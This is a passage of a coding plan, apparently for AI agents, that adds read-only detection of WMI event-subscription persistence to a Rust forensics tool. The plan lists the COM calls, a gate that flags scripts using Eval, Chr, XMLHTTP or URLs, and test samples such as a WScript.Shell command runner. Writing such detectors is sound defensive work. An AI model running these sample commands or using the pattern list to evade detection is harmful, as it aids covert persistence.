# 段 4-塊A：WMI 持久化偵測 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 新增 WMI 永久事件訂閱讀取（`crates/cairn-collectors-win/src/wmi.rs` 手刻 COM 呼叫鏈）+ 安全轉換層（`crates/cairn-collectors/src/wmi_subscription.rs`）+ `persist.rs` 新增 ActiveScript 內容偵測信號，填補 WMI 持久化的完全偵測盲區。

**Architecture:** 沿用 `net.rs` 的既有分層——`cairn-collectors-win` 做 unsafe COM FFI，回傳 plain struct；`cairn-collectors` 做安全轉換成 `Record::Persistence`（`mechanism="wmi_subscription"`）。`persist.rs::evaluate_gate` 新增一條 WMI 專屬信號，處理 `ActiveScriptEventConsumer` 內嵌 ScriptText 無被呼叫執行檔的情況。

**Tech Stack:** Rust、`windows` crate `0.62.2`（新增 `Win32_System_Wmi`/`Win32_System_Com`/`Win32_System_Ole`/`Win32_System_Variant` feature，手刻 COM 呼叫鏈，不引入 `wmi` crate）。

---

## 前置事實（來自完整探查，任務執行時不需重查）

- **`PersistenceRecord`**（`crates/cairn-core/src/record.rs:67-78`）：`mechanism`
  欄位已預留 `wmi_subscription` 字串值，`Record::Persistence` 變體已存在。
  **零 schema 變動**，不新增 Record 變體。

- **`evaluate_gate` 現有結構**（`crates/cairn-heur/src/persist.rs:96-202`）：
  S1a winlogon（101-119）→ S1b IFEO 一律 gate（122-142）→ S2 未簽章+可寫路徑
  （153-162）→ S3 系統名稱偽裝（165-172）→ S4 近期+簽章不明（176-194）→
  S9 腳本直譯器（197-199，呼叫 `script_persistence_signal`）。**新信號插入點：
  S1b 之後、S2 之前**（142行後），因為 WMI 訂閱本身就是罕見持久化手法，設計
  為「一律 gate，嚴重度依內容判斷」（比照 S1b 模式），不像 S2-S4 需要額外
  路徑信號才 gate。

- **`script_persistence_signal`**（persist.rs:37-92）是純函式，可直接複用
  判斷 command 內容是否命中 `INTERPRETERS`/編碼/遠端下載模式。

- **`persistence_entity`**（persist.rs:539-570）目前只有兩分支：
  `mechanism=="startup"` → `entity.file`；其餘 → `entity.registry`。
  **WMI 沒有對應的 registry key**，需要新增第三分支：`mechanism==
  "wmi_subscription"` → 退化填 `entity.registry`，`hive`/`key` 欄位填
  `"WMI"`/WMI namespace 路徑字串（`root\subscription`），因為 `Entity`
  結構（`crates/cairn-core/src/finding.rs`）目前沒有 WMI 專屬子物件，
  新增一個不划算（golden rule：零 schema 變動優先），沿用 `entity.registry`
  的欄位語意夠用（key 欄位本質上就是「這個持久化機制在系統裡的位置標識」）。

- **`net.rs` 分層範本**（`crates/cairn-collectors-win/src/net.rs`）：
  `#[cfg(not(windows))]` 空 stub → `#[cfg(windows)] mod win` 做 unsafe FFI
  → 回傳 plain struct（非 `Record`）。WMI collector 遵循同樣分層。

- **`PersistCollector` wrapper 範本**（`crates/cairn-collectors/src/persist.rs:827-877`）：
  ```rust
  pub struct PersistCollector {
      verifier: Box<dyn FileVerifier + Send + Sync>,
  }
  impl Collector for PersistCollector {
      fn name(&self) -> &str { "persist" }
      fn collect(&self, _ctx: &CollectCtx<'_>) -> Result<Vec<Record>> {
          let mut records: Vec<PersistenceRecord> = Vec::new();
          records.extend(read_run_keys());
          // ...
          apply_signatures(&mut records, self.verifier.as_ref());
          Ok(records.into_iter().map(Record::Persistence).collect())
      }
  }
  ```
  **決策：`WmiSubscriptionCollector` 是獨立的新 `Collector` impl**（`name()`
  回傳 `"wmi_subscription"`），不塞進既有 `PersistCollector`——因為 WMI 讀取
  涉及全新的 unsafe COM 生命週期管理，職責分離更安全，符合現有「每個
  collector 職責單一」的切分粒度（net/proc/persist/logon_session 均獨立）。

- **`signature.rs` 確認無 COM 呼叫**（完整讀取555行確認）：現有 WinTrust/
  Cryptography API 都是純 Win32 C-ABI，不經過 COM。WMI collector 的 COM
  初始化不會與現有程式碼交互，但**不能假設呼叫執行緒已初始化 COM**——
  collector 內部要自行完整 Initialize→Connect→Query→Uninitialize。

- **windows crate 精確 API 簽章**（查證自本機 `~/.cargo/registry/src/
  index.crates.io-1949cf8c6b5b557f/windows-0.62.2/src/Windows/Win32/
  System/Wmi/mod.rs` 與 `System/Com/mod.rs` 原始碼，這是比文件網站更可靠的
  ground truth）：

  ```rust
  // IWbemLocator::ConnectServer（Wmi/mod.rs:6985-6997）
  pub unsafe fn ConnectServer<P6>(
      &self,
      strnetworkresource: &windows_core::BSTR,
      struser: &windows_core::BSTR,
      strpassword: &windows_core::BSTR,
      strlocale: &windows_core::BSTR,
      lsecurityflags: i32,
      strauthority: &windows_core::BSTR,
      pctx: P6,
  ) -> windows_core::Result<IWbemServices>
  where P6: windows_core::Param<IWbemContext>;

  // IWbemServices::ExecQuery（Wmi/mod.rs:8593-8600）
  pub unsafe fn ExecQuery<P3>(
      &self,
      strquerylanguage: &windows_core::BSTR,
      strquery: &windows_core::BSTR,
      lflags: WBEM_GENERIC_FLAG_TYPE,
      pctx: P3,
  ) -> windows_core::Result<IEnumWbemClassObject>
  where P3: windows_core::Param<IWbemContext>;

  // IEnumWbemClassObject::Next（Wmi/mod.rs:34-36）— 裸 HRESULT，非 Result<()>！
  pub unsafe fn Next(
      &self,
      ltimeout: i32,
      apobjects: &mut [Option<IWbemClassObject>],
      pureturned: *mut u32,
  ) -> windows_core::HRESULT;

  // IWbemClassObject::Get（Wmi/mod.rs:5313-5319）
  // 需要三個 feature 同時開啟：Win32_System_Com + Win32_System_Ole + Win32_System_Variant
  #[cfg(all(feature = "Win32_System_Com", feature = "Win32_System_Ole", feature = "Win32_System_Variant"))]
  pub unsafe fn Get<P0>(
      &self,
      wszname: P0,
      lflags: i32,
      pval: *mut super::Variant::VARIANT,
      ptype: Option<*mut i32>,
      plflavor: Option<*mut i32>,
  ) -> windows_core::Result<()>
  where P0: windows_core::Param<windows_core::PCWSTR>;

  // CoInitializeEx（Com/mod.rs:334-337）— 裸 HRESULT，S_FALSE 非錯誤！
  pub unsafe fn CoInitializeEx(
      pvreserved: Option<*const core::ffi::c_void>,
      dwcoinit: COINIT,
  ) -> windows_core::HRESULT;

  // COINIT 列舉（Com/mod.rs:1764,1802-1805）
  pub const COINIT_MULTITHREADED: COINIT = COINIT(0i32);
  pub const COINIT_APARTMENTTHREADED: COINIT = COINIT(2i32);

  // CoInitializeSecurity（Com/mod.rs:340）
  pub unsafe fn CoInitializeSecurity(
      psecdesc: Option<PSECURITY_DESCRIPTOR>,
      cauthsvc: i32,
      asauthsvc: Option<*const SOLE_AUTHENTICATION_SERVICE>,
      preserved1: Option<*const core::ffi::c_void>,
      dwauthnlevel: RPC_C_AUTHN_LEVEL,
      dwimplevel: RPC_C_IMP_LEVEL,
      pauthlist: Option<*const core::ffi::c_void>,
      dwcapabilities: EOLE_AUTHENTICATION_CAPABILITIES,
      preserved3: Option<*const core::ffi::c_void>,
  ) -> windows_core::Result<()>;

  // CoCreateInstance（Com/mod.rs:117-126）
  pub unsafe fn CoCreateInstance<P1, T>(
      rclsid: *const windows_core::GUID,
      punkouter: P1,
      dwclscontext: CLSCTX,
  ) -> windows_core::Result<T>
  where P1: windows_core::Param<windows_core::IUnknown>, T: windows_core::Interface;
  ```

  **`CLSID_WbemLocator` 沒有現成常數**（crate 內搜尋零匹配），要手動建構：
  ```rust
  const CLSID_WBEM_LOCATOR: windows_core::GUID =
      windows_core::GUID::from_u128(0xdc12a687_737f_11cf_884d_00aa004b2e24);
  ```
  這個 GUID 值同時是 `IWbemLocator` 的 IID 與 `CLSID_WbemLocator`（微軟 WMI
  的既有慣例，兩者數值相同）。`IID` 不需要另外指定——`CoCreateInstance::<_,
  IWbemLocator>(&CLSID_WBEM_LOCATOR, None, CLSCTX_INPROC_SERVER)` 由
  `Interface::IID` 關聯常數自動提供。

  **`VARIANT` 型別提取**（`windows-0.62.2/src/extensions/Win32/System/
  Variant.rs`）：`impl TryFrom<&VARIANT> for BSTR`（130行）、
  `VARIANT::vt() -> VARENUM`（39行）判斷 `VT_EMPTY`。

- **已知未查證項目（實作時第一步要處理）**：`RPC_C_AUTHN_LEVEL`/
  `RPC_C_IMP_LEVEL` 確切所屬的 `windows` crate feature 名稱未查證——Task 1
  Step 1 先跑一次 `cargo build` 觸發編譯器報缺失 feature，或用
  `grep -r "RPC_C_AUTHN" ~/.cargo/registry/src/*/windows-0.62.2/Cargo.toml`
  找到精確 feature 字串再繼續。

- **CARGO_TARGET_DIR 與 linker**：
  ```bash
  export CARGO_TARGET_DIR=/c/Users/bosen/AppData/Local/cairn-target
  export CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER="C:\\Program Files (x86)\\Microsoft Visual Studio\\18\\BuildTools\\VC\\Tools\\MSVC\\14.51.36231\\bin\\Hostx64\\x64\\link.exe"
  ```
  不寫進 `.cargo/config.toml`。

- **測試分工**：Task 1-2 的 implementer 跑 `cargo test -p cairn-collectors-win`；
  Task 3 跑 `cargo test -p cairn-collectors`；Task 4 跑 `cargo test -p cairn-heur`；
  Task 5（main.rs 接線）跨 crate 邊界，controller 跑一次全 workspace。

---

## Task 1: `windows` crate feature 新增 + COM 呼叫鏈骨架

**Files:**
- Modify: `crates/cairn-collectors-win/Cargo.toml`
- Create: `crates/cairn-collectors-win/src/wmi.rs`

- [ ] **Step 1: 確認 `RPC_C_AUTHN_LEVEL`/`RPC_C_IMP_LEVEL` 的精確 feature 名稱**

```bash
grep -n "RPC_C_AUTHN\|RPC_C_IMP" "$(find ~/.cargo/registry/src -maxdepth 1 -iname 'index.crates.io-*' | head -1)/windows-0.62.2/Cargo.toml" 2>&1 | head -20
```

若這個指令找不到對應行（feature flag 定義通常不在 Cargo.toml 而是原始碼裡的
`#[cfg(feature = "...")]`），改用：

```bash
grep -rn "pub struct RPC_C_AUTHN_LEVEL\|pub struct RPC_C_IMP_LEVEL" "$(find ~/.cargo/registry/src -maxdepth 1 -iname 'index.crates.io-*' | head -1)/windows-0.62.2/src/Windows/Win32/System/" 2>&1
```

找到定義檔案後，往上找該檔案所在模組對應哪個 feature（通常型別定義檔案路徑
本身就對應 feature 名稱，例如 `Win32/System/Rpc/mod.rs` 對應
`Win32_System_Rpc`）。記錄找到的精確 feature 字串，下一步要用。

- [ ] **Step 2: 修改 `crates/cairn-collectors-win/Cargo.toml`**，在既有
  `features = [...]` 陣列裡新增（保留全部既有項目不動）：

```toml
  "Win32_System_Wmi",
  "Win32_System_Com",
  "Win32_System_Ole",
  "Win32_System_Variant",
  "Win32_System_Rpc",
```

（最後一項若 Step 1 找到的實際名稱不同，改用實際查到的名稱。）

- [ ] **Step 3: 編譯確認 feature 新增無誤**

```bash
export CARGO_TARGET_DIR=/c/Users/bosen/AppData/Local/cairn-target
export CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER="C:\\Program Files (x86)\\Microsoft Visual Studio\\18\\BuildTools\\VC\\Tools\\MSVC\\14.51.36231\\bin\\Hostx64\\x64\\link.exe"
cd /c/Users/bosen/OneDrive/Desktop/claude_dev/IIR_tool/cairn
cargo check -p cairn-collectors-win
```

Expected: 編譯成功（此時 `wmi.rs` 還沒建立，不會用到新 feature，純粹確認
`Cargo.toml` 語法正確、feature 名稱真實存在不會導致 `cargo` 解析錯誤）。

- [ ] **Step 4: 建立 `crates/cairn-collectors-win/src/wmi.rs`**

```rust
//! Reads WMI permanent event subscriptions (`root\subscription` namespace):
//! __EventFilter, __EventConsumer (CommandLineEventConsumer /
//! ActiveScriptEventConsumer), and __FilterToConsumerBinding.
//!
//! Why: WMI event subscriptions are a common fileless persistence mechanism —
//! a filter (WQL trigger condition) bound to a consumer (action taken) survives
//! reboots without any file on disk. This is read-only WMI querying; no
//! subscriptions are created, modified, or deleted.
//!
//! Hand-rolled COM call chain (CoInitializeEx -> CoCreateInstance -> ConnectServer
//! -> ExecQuery -> IWbemClassObject::Get) rather than the `wmi` crate — see
//! docs/dev-history/2026-07-16-wmi-persistence-research.md for why (the `wmi`
//! crate has a known, unresolved (WONTFIX) UB issue mixing its own COM lifecycle
//! management with windows-rs's).

use cairn_core::Result;

/// One WMI event consumer bound to a filter, as read from the OS.
#[derive(Debug, Clone)]
pub struct RawWmiSubscription {
    pub filter_name: String,
    pub filter_query: String,
    pub consumer_name: String,
    /// "CommandLineEventConsumer" | "ActiveScriptEventConsumer" | other consumer class name
    pub consumer_type: String,
    /// CommandLineTemplate (CommandLineEventConsumer) or ScriptText (ActiveScriptEventConsumer)
    pub command: Option<String>,
}

/// Non-Windows: empty (WMI is Windows-only).
#[cfg(not(windows))]
pub fn enumerate_subscriptions() -> Result<Vec<RawWmiSubscription>> {
    Ok(vec![])
}

#[cfg(windows)]
pub fn enumerate_subscriptions() -> Result<Vec<RawWmiSubscription>> {
    win::enumerate_subscriptions()
}

#[cfg(windows)]
mod win {
    use super::RawWmiSubscription;
    use cairn_core::{CairnError, Result};
    use windows::core::{BSTR, GUID, PCWSTR};
    use windows::Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CoInitializeSecurity, CoUninitialize,
        CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED, EOAC_NONE,
    };
    use windows::Win32::System::Rpc::{RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE};
    use windows::Win32::System::Variant::VARIANT;
    use windows::Win32::System::Wmi::{
        IWbemClassObject, IWbemLocator, IWbemServices, WBEM_FLAG_FORWARD_ONLY,
        WBEM_FLAG_RETURN_IMMEDIATELY,
    };

    const CLSID_WBEM_LOCATOR: GUID =
        GUID::from_u128(0xdc12a687_737f_11cf_884d_00aa004b2e24);

    /// RAII guard: calls CoUninitialize on drop. Every `enumerate_subscriptions`
    /// call owns exactly one Initialize/Uninitialize pair on this thread — never
    /// assumes the caller's thread has already initialized COM, and never leaves
    /// COM initialized after returning (whether success or failure).
    struct ComGuard;
    impl Drop for ComGuard {
        fn drop(&mut self) {
            // SAFETY: CoUninitialize must be called once per successful
            // CoInitializeEx on the same thread; ComGuard is only constructed
            // after a successful CoInitializeEx call (see init_com below).
            unsafe {
                CoUninitialize();
            }
        }
    }

    /// Initializes COM on this thread (COINIT_MULTITHREADED) and installs
    /// process-wide default security. Returns None (abstain) rather than panic
    /// on any failure — WMI querying is best-effort inventory, not critical path.
    fn init_com() -> Option<ComGuard> {
        // SAFETY: pvreserved must be None per the Windows API contract; return
        // value is a bare HRESULT where S_FALSE (already initialized on this
        // thread) is not an error condition, only genuine failure HRESULTs are.
        let hr = unsafe { CoInitializeEx(None, COINIT_MULTITHREADED) };
        if hr.is_err() {
            return None;
        }
        let guard = ComGuard;

        // SAFETY: all Option-typed params are documented as nullable; called
        // exactly once per process per Microsoft's API contract (best-effort:
        // if a prior call already set security, this returns an error we
        // tolerate rather than abstain on, since querying can still proceed).
        let _ = unsafe {
            CoInitializeSecurity(
                None,
                -1,
                None,
                None,
                RPC_C_AUTHN_LEVEL_DEFAULT,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                None,
                EOAC_NONE,
                None,
            )
        };
        Some(guard)
    }

    /// Reads a BSTR property from a WMI object by name. None on any failure
    /// (missing property, wrong VARIANT type, empty value) — never panics.
    fn get_bstr_prop(obj: &IWbemClassObject, name: &str) -> Option<String> {
        let wname: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
        let mut val = VARIANT::default();
        // SAFETY: obj is a valid IWbemClassObject from a successful ExecQuery
        // enumeration; wname is NUL-terminated; val is a local out-param.
        let ok = unsafe {
            obj.Get(PCWSTR(wname.as_ptr()), 0, &mut val, None, None)
        };
        if ok.is_err() {
            return None;
        }
        let bstr: windows_core::Result<BSTR> = (&val).try_into();
        bstr.ok().map(|b| b.to_string())
    }

    pub fn enumerate_subscriptions() -> Result<Vec<RawWmiSubscription>> {
        let Some(_com_guard) = init_com() else {
            // Graceful degrade: COM unavailable on this host/thread -> empty
            // result, not an error (golden rule 8). The caller's manifest
            // should record this via the Collector::sources() error path.
            return Ok(vec![]);
        };

        // SAFETY: CLSID_WBEM_LOCATOR is a valid, well-known WMI CLSID; None
        // means no aggregation; CLSCTX_INPROC_SERVER requests an in-process
        // COM server, the standard WMI locator activation context.
        let locator: IWbemLocator = match unsafe {
            CoCreateInstance(&CLSID_WBEM_LOCATOR, None, CLSCTX_INPROC_SERVER)
        } {
            Ok(l) => l,
            Err(_) => return Ok(vec![]), // abstain: WMI locator unavailable
        };

        let namespace = BSTR::from(r"root\subscription");
        let empty = BSTR::new();
        // SAFETY: locator is a valid IWbemLocator from CoCreateInstance above;
        // all BSTR params are valid (empty BSTR is a documented way to pass
        // "use defaults" for user/password/locale/authority); None for pctx.
        let services: IWbemServices = match unsafe {
            locator.ConnectServer(&namespace, &empty, &empty, &empty, 0, &empty, None)
        } {
            Ok(s) => s,
            Err(_) => return Ok(vec![]), // abstain: namespace unavailable/access denied
        };

        let mut out = Vec::new();
        out.extend(query_bindings(&services)?);
        Ok(out)
    }

    /// Queries __FilterToConsumerBinding, then for each binding resolves the
    /// bound __EventFilter and consumer object to build a RawWmiSubscription.
    fn query_bindings(services: &IWbemServices) -> Result<Vec<RawWmiSubscription>> {
        let wql = BSTR::from("SELECT * FROM __FilterToConsumerBinding");
        let query_lang = BSTR::from("WQL");
        let flags = WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY;
        // SAFETY: services is a valid IWbemServices from ConnectServer above;
        // query_lang/wql are valid BSTRs; None for pctx.
        let enumerator = match unsafe { services.ExecQuery(&query_lang, &wql, flags, None) } {
            Ok(e) => e,
            Err(_) => return Ok(vec![]), // abstain: query failed
        };

        let mut out = Vec::new();
        loop {
            let mut objects: [Option<IWbemClassObject>; 1] = [None];
            let mut returned: u32 = 0;
            // SAFETY: enumerator is valid; objects is a 1-element buffer sized
            // to match apobjects.len(); returned is a valid out-param.
            let hr = unsafe { enumerator.Next(-1, &mut objects, &mut returned) };
            if hr.is_err() || returned == 0 {
                break;
            }
            let Some(binding_obj) = objects[0].take() else {
                break;
            };

            let Some(filter_ref) = get_bstr_prop(&binding_obj, "Filter") else {
                continue; // abstain on this one binding, keep scanning others
            };
            let Some(consumer_ref) = get_bstr_prop(&binding_obj, "Consumer") else {
                continue;
            };

            if let Some(sub) = resolve_subscription(services, &filter_ref, &consumer_ref) {
                out.push(sub);
            }
        }
        Ok(out)
    }

    /// Resolves a binding's Filter/Consumer path references (WMI relative-path
    /// strings like `__EventFilter.Name="X"`) into a full RawWmiSubscription by
    /// re-querying each referenced object directly.
    fn resolve_subscription(
        services: &IWbemServices,
        filter_ref: &str,
        consumer_ref: &str,
    ) -> Option<RawWmiSubscription> {
        let filter_obj = get_object_by_path(services, filter_ref)?;
        let filter_name = get_bstr_prop(&filter_obj, "Name").unwrap_or_default();
        let filter_query = get_bstr_prop(&filter_obj, "Query").unwrap_or_default();

        let consumer_obj = get_object_by_path(services, consumer_ref)?;
        let consumer_name = get_bstr_prop(&consumer_obj, "Name").unwrap_or_default();
        // consumer_ref looks like: CommandLineEventConsumer.Name="X"
        let consumer_type = consumer_ref
            .split('.')
            .next()
            .unwrap_or("unknown")
            .to_string();
        let command = get_bstr_prop(&consumer_obj, "CommandLineTemplate")
            .or_else(|| get_bstr_prop(&consumer_obj, "ScriptText"));

        Some(RawWmiSubscription {
            filter_name,
            filter_query,
            consumer_name,
            consumer_type,
            command,
        })
    }

    /// GetObject by a WMI relative path string (e.g. `__EventFilter.Name="X"`).
    fn get_object_by_path(services: &IWbemServices, path: &str) -> Option<IWbemClassObject> {
        let wpath = BSTR::from(path);
        // SAFETY: services valid; wpath is a valid BSTR; None for context.
        unsafe { services.GetObject(&wpath, 0, None, None, None) }.ok()
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        /// Smoke test: enumerate_subscriptions never panics and returns
        /// Ok(...) even on a machine with zero WMI subscriptions configured
        /// (the common case — this must not be misread as a failure).
        #[test]
        fn enumerate_subscriptions_does_not_panic() {
            let result = enumerate_subscriptions();
            assert!(result.is_ok(), "enumerate_subscriptions must not error on a clean host");
        }
    }
}
```

**implementer 注意**：`IWbemServices::GetObject` 的簽章本次探查未逐一驗證
（只推測存在，同構於 `ExecQuery`）——實作到這裡若編譯錯誤，先用
`grep -n "pub unsafe fn GetObject" ~/.cargo/registry/src/*/windows-0.62.2/src/Windows/Win32/System/Wmi/mod.rs`
確認真實簽章，依實際簽章調整參數，不要臆測硬套。

- [ ] **Step 5: 在 `lib.rs` 註冊模組**

```rust
#[cfg(windows)]
mod wmi;
```

（比照 Task 段 `cmdline_reader` 的教訓——**這裡的 `#[cfg(windows)]` 是必要的**，
否則會在非 Windows CI job 上編譯失敗，見 `docs/REMAINING-WORK.md` 的
「流程缺陷教訓」章節記錄的坑。）

若 `wmi.rs` 內需要對外暴露 `RawWmiSubscription`/`enumerate_subscriptions`
給 `cairn-collectors` 使用，改用 `pub(crate) mod wmi;` 或視 Task 3 的實際
呼叫需求決定可見度（`pub mod wmi;` 若跨 crate 呼叫）。

- [ ] **Step 6: 編譯與測試**

```bash
export CARGO_TARGET_DIR=/c/Users/bosen/AppData/Local/cairn-target
export CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER="C:\\Program Files (x86)\\Microsoft Visual Studio\\18\\BuildTools\\VC\\Tools\\MSVC\\14.51.36231\\bin\\Hostx64\\x64\\link.exe"
cargo check -p cairn-collectors-win
cargo test -p cairn-collectors-win
```

Expected: 編譯成功；既有測試全過；新增的
`enumerate_subscriptions_does_not_panic` 通過（在真機上執行，若機器上剛好
有 WMI 訂閱也不影響這個測試，只斷言 `is_ok()`）。

- [ ] **Step 7: Commit**

```bash
git add crates/cairn-collectors-win/Cargo.toml crates/cairn-collectors-win/src/wmi.rs crates/cairn-collectors-win/src/lib.rs
git commit -m "feat(collectors-win): read WMI permanent event subscriptions via hand-rolled COM"
```

---

## Task 2: `cairn-collectors::wmi_subscription` 安全轉換層

**Files:**
- Create: `crates/cairn-collectors/src/wmi_subscription.rs`
- Modify: `crates/cairn-collectors/src/lib.rs`（模組註冊）

- [ ] **Step 1: 讀取 `crates/cairn-collectors/src/persist.rs` 的
  `FileVerifier`/`apply_signatures`/`resolve_relative_binary_paths` 完整定義**
  （這些是 Task 1 的探查已確認可直接複用的既有 helper，implementer 需要
  自己用 Read 工具讀一次確認精確簽名，因為計畫階段沒有把這幾個函式的完整
  程式碼列出，只確認了呼叫方式）。

- [ ] **Step 2: 建立 `crates/cairn-collectors/src/wmi_subscription.rs`**

```rust
//! Converts raw WMI subscription data (cairn-collectors-win::wmi) into
//! PersistenceRecord entries with mechanism="wmi_subscription".
#![forbid(unsafe_code)]

use cairn_core::record::PersistenceRecord;
use cairn_core::traits::{CollectCtx, Collector, SourceEntry};
use cairn_core::{Record, Result};

/// Extracts a plausible executable path from a CommandLineEventConsumer's
/// CommandLineTemplate (e.g. `C:\Windows\System32\cmd.exe /c ...` -> the exe
/// part). Returns None for ActiveScriptEventConsumer entries (ScriptText has
/// no invoked executable — this is the exact gap this segment exists to
/// surface, not paper over with a guess).
fn extract_binary_path(consumer_type: &str, command: &str) -> Option<String> {
    if consumer_type != "CommandLineEventConsumer" {
        return None;
    }
    // Best-effort: first whitespace-delimited token, stripped of quotes.
    command
        .trim()
        .split_whitespace()
        .next()
        .map(|s| s.trim_matches('"').to_string())
        .filter(|s| !s.is_empty())
}

pub struct WmiSubscriptionCollector;

impl Collector for WmiSubscriptionCollector {
    fn name(&self) -> &str {
        "wmi_subscription"
    }

    fn collect(&self, _ctx: &CollectCtx<'_>) -> Result<Vec<Record>> {
        #[cfg(windows)]
        let raw = cairn_collectors_win::wmi::enumerate_subscriptions()?;
        #[cfg(not(windows))]
        let raw: Vec<cairn_collectors_win::wmi::RawWmiSubscription> = vec![];

        let records: Vec<PersistenceRecord> = raw
            .into_iter()
            .map(|sub| {
                let binary_path = sub
                    .command
                    .as_deref()
                    .and_then(|c| extract_binary_path(&sub.consumer_type, c));
                PersistenceRecord {
                    mechanism: "wmi_subscription".to_string(),
                    location: format!("{} -> {}", sub.filter_name, sub.consumer_name),
                    value: Some(sub.consumer_name.clone()),
                    command: sub.command,
                    binary_path,
                    binary_sha256: None,
                    signed: None,
                    signer: None,
                    last_write: None,
                }
            })
            .collect();

        Ok(records.into_iter().map(Record::Persistence).collect())
    }

    fn sources(&self) -> Vec<SourceEntry> {
        vec![SourceEntry {
            artifact: "wmi_subscription".into(),
            path: r"live:root\subscription".into(),
            method: "com".into(),
            size: 0,
            sha256: String::new(),
            errors: vec![],
        }]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn command_line_consumer_extracts_binary_path() {
        let path = extract_binary_path(
            "CommandLineEventConsumer",
            r#"C:\Windows\System32\cmd.exe /c whoami"#,
        );
        assert_eq!(path, Some(r"C:\Windows\System32\cmd.exe".to_string()));
    }

    #[test]
    fn active_script_consumer_never_gets_binary_path() {
        // This is the exact case S9 gate cannot see: no invoked executable.
        let path = extract_binary_path(
            "ActiveScriptEventConsumer",
            r#"CreateObject("WScript.Shell").Run("cmd.exe")"#,
        );
        assert_eq!(path, None);
    }

    #[test]
    fn empty_command_line_yields_no_binary_path() {
        let path = extract_binary_path("CommandLineEventConsumer", "");
        assert_eq!(path, None);
    }
}
```

**implementer 注意**：`binary_sha256`/`signed`/`signer` 這裡先留 `None`——
若 Task 1 讀取的 `apply_signatures`/`FileVerifier` 介面可以直接複用（對
`binary_path` 有值的記錄補簽章驗證），可以在這個 Task 補上呼叫；若介面
不相容（例如需要 `Vec<PersistenceRecord>` 的可變參考且與既有 persist
records 混在一起處理），則保留 `None` 並在 commit message 註明「簽章驗證
留待後續，因為當前架構下 WmiSubscriptionCollector 是獨立 collector 不與
PersistCollector 共用簽章驗證流程」——這是一個實作階段可以自行判斷的
邊界情況，不強制在本 Task 解決。

- [ ] **Step 3: 在 `crates/cairn-collectors/src/lib.rs` 註冊模組**

```rust
pub mod wmi_subscription;
```

（比照既有 `pub mod persist;` 等風格。）

- [ ] **Step 4: 編譯與測試**

```bash
cargo test -p cairn-collectors
```

Expected: 3 個新測試通過（`command_line_consumer_extracts_binary_path`、
`active_script_consumer_never_gets_binary_path`、
`empty_command_line_yields_no_binary_path`），既有測試不受影響。

- [ ] **Step 5: Commit**

```bash
git add crates/cairn-collectors/src/wmi_subscription.rs crates/cairn-collectors/src/lib.rs
git commit -m "feat(collectors): convert WMI subscriptions to PersistenceRecord"
```

---

## Task 3: `persist.rs` 新增 WMI 偵測信號 + entity 映射

**Files:**
- Modify: `crates/cairn-heur/src/persist.rs`

- [ ] **Step 1: 在 `evaluate_gate` 新增 WMI 信號**

先用 Read 工具讀取 `crates/cairn-heur/src/persist.rs:96-202` 的完整
`evaluate_gate` 函式，確認 S1b（IFEO，122-142行）結束的確切位置，在其後、
S2 開始前插入：

```rust
// S1c: WMI event subscription persistence. Rare by nature — a normal system
// has no user-authored WMI permanent event subscriptions — so any binding
// gates unconditionally, with severity determined by content inspection
// (mirrors S1b's "always gate" posture for IFEO debugger hijacking).
if p.mechanism == "wmi_subscription" {
    let content = p.command.as_deref().unwrap_or("");
    // ActiveScriptEventConsumer has no invoked executable for S9 to pattern-
    // match against (binary_path is None by construction — see
    // wmi_subscription.rs::extract_binary_path). Inspect the script content
    // directly rather than the invocation, closing the exact gap this
    // segment exists to fix.
    if p.binary_path.is_none() {
        let suspicious = content.contains("Chr(")
            || content.contains("Eval(")
            || content.contains("ExecuteGlobal")
            || content.contains("XMLHTTP")
            || content.contains("WinHttp.WinHttpRequest")
            || content.to_lowercase().contains("http://")
            || content.to_lowercase().contains("https://");
        hits.push(GateHit {
            signal: "S1c",
            severity: if suspicious { Severity::High } else { Severity::Medium },
            reason: if suspicious {
                "WMI event subscription runs an inline script referencing \
                 dynamic execution or remote content — no invoked executable \
                 exists for the standard interpreter check (S9) to see"
                    .to_string()
            } else {
                "WMI event subscription runs an inline script with no invoked \
                 executable; content inspection found no obviously suspicious \
                 pattern, but WMI subscriptions are unusual enough to warrant \
                 review"
                    .to_string()
            },
        });
    } else {
        // CommandLineEventConsumer *does* have an invoked executable —
        // S2/S3/S4/S9 below already cover it via binary_path/command, so this
        // mechanism doesn't need a separate unconditional gate here; it just
        // needs to not be excluded from the checks below (unlike "startup",
        // wmi_subscription does NOT set path_signals_apply = false).
    }
}
```

**注意此程式碼片段用到 `GateHit`/`hits`/`Severity` 等識別字**——implementer
必須先讀取 `evaluate_gate` 函式的實際簽名與內部變數命名（本計畫的探查階段
只確認了函式邏輯流程，沒有逐字讀出 `hits` 這個累積 vec 的確切變數名稱，
若實際變數名不同，依實際程式碼調整，不要臆測）。同樣需要確認 `GateHit`
struct 的確切欄位名稱（`signal`/`severity`/`reason` 是本計畫依既有慣例推測
的欄位名，需對照 persist.rs 實際定義核實）。

**同時確認**：`p.mechanism != "startup"` 這個既有排除條件（150行附近的
`path_signals_apply`）不應該把 `wmi_subscription` 也排除在外——WMI 訂閱
若是 `CommandLineEventConsumer`（有 `binary_path`），S2/S3/S4 的路徑信號
應該正常適用（跟其他有執行檔路徑的 mechanism 一樣）。

- [ ] **Step 2: 更新 `persistence_entity` 新增 WMI 分支**

找到 `persist.rs:539-570` 的 `persistence_entity` 函式，現況只有
`startup`→file、其餘→registry 兩分支，改為：

```rust
fn persistence_entity(p: &PersistenceRecord) -> Entity {
    if p.mechanism == "startup" {
        Entity {
            file: Some(EntityFile {
                path: p
                    .binary_path
                    .clone()
                    .or_else(|| p.value.clone())
                    .unwrap_or_default(),
                sha256: None,
                mtime: p.last_write,
                si_btime: None,
                fn_btime: None,
                si_mtime: None,
                fn_mtime: None,
                path_complete: None,
